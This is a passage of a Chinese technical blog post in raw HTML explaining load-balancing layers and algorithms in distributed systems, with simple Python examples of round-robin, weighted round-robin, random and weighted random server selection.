src=\"http://jbcdn2.b0.upaiyun.com/2018/01/b4822f398c6b3d29e8f309640f2bb305.png\" alt=\"\"></p>\n<p>常见互联网分布式架构如上，分为客户端层、反向代理nginx层、站点层、服务层、数据层。可以看到，每一个下游都有多个上游调用，只需要做到，<strong>每一个上游都均匀访问每一个下游</strong>，就能实现“将请求/数据【均匀】分摊到多个操作单元上执行”。</p>\n<p>(1)【客户端层】到【反向代理层】的负载均衡，是通过“DNS轮询”实现的<br>\n(2)【反向代理层】到【站点层】的负载均衡，是通过“nginx”实现的<br>\n(3)【站点层】到【服务层】的负载均衡，是通过“服务连接池”实现的<br>\n(4)【数据层】的负载均衡，要考虑“数据的均衡”与“请求的均衡”两个点，常见的方式有“按照范围水平切分”与“hash水平切分”。</p>\n<p>数据层的负载均衡，在我之前的《<a href=\"http://www.cnblogs.com/xybaby/p/7076731.html\" target=\"_blank\">带着问题学习分布式系统之数据分片</a>》中有详细介绍。</p>\n<h1>算法衡量</h1>\n<p>在我看来，当我们提到一个负载均衡算法，或者具体的应用场景时，应该考虑以下问题</p>\n<p>第一，是否意识到不同节点的服务能力是不一样的，比如CPU、内存、网络、地理位置</p>\n<p>第二，是否意识到节点的服务能力是动态变化的，高配的机器也有可能由于一些突发原因导致处理速度变得很慢</p>\n<p>第三，是否考虑将同一个客户端，或者说同样的请求分发到同一个处理节点，这对于“有状态”的服务非常重要，比如session，比如分布式存储</p>\n<p>第四，谁来负责负载均衡，即谁充当负载均衡器（load balancer），balancer本身是否会成为瓶颈</p>\n<p>下面会结合具体的算法来考虑这些问题</p>\n<h1>负载均衡算法</h1>\n<h2>轮询算法（round-robin）</h2>\n<p>思想很简单，就是提供同质服务的节点逐个对外提供服务，这样能做到绝对的均衡。Python示例代码如下</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c07e8872993677827\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nSERVER_LIST = [\r\n    '10.246.10.1',\r\n    '10.246.10.2',\r\n    '10.246.10.3',\r\n]\r\ndef round_robin(server_lst, cur = [0]):\r\n    length = len(server_lst)\r\n    ret = server_lst[cur[0] % length]\r\n    cur[0] = (cur[0] + 1) % length\r\n    return ret</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c07e8872993677827-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c07e8872993677827-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634c07e8872993677827-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c07e8872993677827-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634c07e8872993677827-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c07e8872993677827-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634c07e8872993677827-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c07e8872993677827-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a634c07e8872993677827-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c07e8872993677827-10\">10</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c07e8872993677827-1\"><span class=\"crayon-v\">SERVER_LIST</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c07e8872993677827-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">'10.246.10.1'</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5a634c07e8872993677827-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">'10.246.10.2'</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c07e8872993677827-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">'10.246.10.3'</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5a634c07e8872993677827-5\"><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c07e8872993677827-6\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">round_robin</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">server_lst</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cur</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a634c07e8872993677827-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">length</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">len</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">server_lst</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c07e8872993677827-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">ret</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">server_lst</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">cur</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5a634c07e8872993677827-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">cur</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">cur</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">length</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c07e8872993677827-10\"><span class=\"crayon-e\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ret</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0019 seconds] -->\r\n\n</div>\n<p>可以看到，所有的节点都是以同样的概率提供服务，即没有考虑到节点的差异，也许同样数目的请求，高配的机器CPU才20%，低配的机器CPU已经80%了</p>\n<h2>加权轮询算法（weight round-robin）</h2>\n<p>加权轮训算法就是在轮训算法的基础上，考虑到机器的差异性，分配给机器不同的权重，能者多劳。注意，这个权重的分配依赖于请求的类型，比如计算密集型，那就考虑CPU、内存；如果是IO密集型，那就考虑磁盘性能。Python示例代码如下</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c07e887c335412280\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nWEIGHT_SERVER_LIST = {\r\n    '10.246.10.1': 1,\r\n    '10.246.10.2': 3,\r\n    '10.246.10.3': 2,\r\n}\r\n\r\ndef weight_round_robin(servers, cur = [0]):\r\n    weighted_list = []\r\n    for k, v in servers.iteritems():\r\n        weighted_list.extend([k] * v)\r\n\r\n    length = len(weighted_list)\r\n    ret = weighted_list[cur[0] % length]\r\n    cur[0] = (cur[0] + 1) % length\r\n    return ret</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c07e887c335412280-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c07e887c335412280-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634c07e887c335412280-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c07e887c335412280-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634c07e887c335412280-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c07e887c335412280-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634c07e887c335412280-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c07e887c335412280-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a634c07e887c335412280-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c07e887c335412280-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a634c07e887c335412280-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c07e887c335412280-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a634c07e887c335412280-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c07e887c335412280-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a634c07e887c335412280-15\">15</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c07e887c335412280-1\"><span class=\"crayon-v\">WEIGHT_SERVER_LIST</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c07e887c335412280-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">'10.246.10.1'</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5a634c07e887c335412280-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">'10.246.10.2'</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c07e887c335412280-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-s\">'10.246.10.3'</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5a634c07e887c335412280-5\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c07e887c335412280-6\"> </div><div class=\"crayon-line\" id=\"crayon-5a634c07e887c335412280-7\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">weight_round_robin</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">servers</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cur</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c07e887c335412280-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">weighted_list</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5a634c07e887c335412280-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">k</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">v</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">servers</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">iteritems</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c07e887c335412280-10\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">weighted_list</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">extend</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">k</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">v</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a634c07e887c335412280-11\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c07e887c335412280-12\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">length</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">len</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">weighted_list</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a634c07e887c335412280-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">ret</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">weighted_list</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">cur</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c07e887c335412280-14\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">cur</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">cur</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">length</span></div><div class=\"crayon-line\" id=\"crayon-5a634c07e887c335412280-15\"><span class=\"crayon-e\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ret</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0027 seconds] -->\r\n\n</div>\n<h2>随机算法（random）</h2>\n<p>这个就更好理解了，随机选择一个节点服务，按照概率，只要请求数量足够多，那么也能达到绝对均衡的效果。而且实现简单很多</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c07e8882236254436\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef random_choose(server_lst):\r\n    import random\r\n    random.seed()\r\n    return random.choice(server_lst)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c07e8882236254436-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c07e8882236254436-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634c07e8882236254436-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c07e8882236254436-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c07e8882236254436-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">random_choose</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">server_lst</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c07e8882236254436-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">import </span><span class=\"crayon-e\">random</span></div><div class=\"crayon-line\" id=\"crayon-5a634c07e8882236254436-3\"><span class=\"crayon-e\">    </span><span class=\"crayon-v\">random</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">seed</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c07e8882236254436-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">random</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">choice</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">server_lst</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n\n</div>\n<h2>加权随机算法（random）</h2>\n<p>如同加权轮训算法至于轮训算法一样，也是在随机的时候引入不同节点的权重，实现也很类似。</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c07e8885635320514\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef weight_random_choose(servers):\r\n    import random\r\n    random.seed()\r\n    weighted_list = []\r\n    for k, v in servers.iteritems():\r\n        weighted_list.extend([k] * v)\r\n    return random.choice(weighted_list)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c07e8885635320514-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c07e8885635320514-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634c07e8885635320514-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c07e8885635320514-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634c07e8885635320514-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c07e8885635320514-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634c07e8885635320514-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c07e8885635320514-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">weight_random_choose</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">servers</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c07e8885635320514-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">import </span><span class=\"crayon-e\">random</span></div><div class=\"crayon-line\" id=\"crayon-5a634c07e8885635320514-3\"><span class=\"crayon-e\">    </span><span class=\"crayon-v\">random</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">seed</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c07e8885635320514-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">weighted_list</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5a634c07e8885635320514-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">k</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">v</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">servers</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">iteritems</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c07e8885635320514-6\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">weighted_list</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">extend</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">k</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">v</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a634c07e8885635320514-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">random</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">choice</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">weighted_list</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n\n</div>\n<p>当然，如果节点列表以及权重变化不大，那么也可以对所有节点归一化，然后按概率区间选择</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 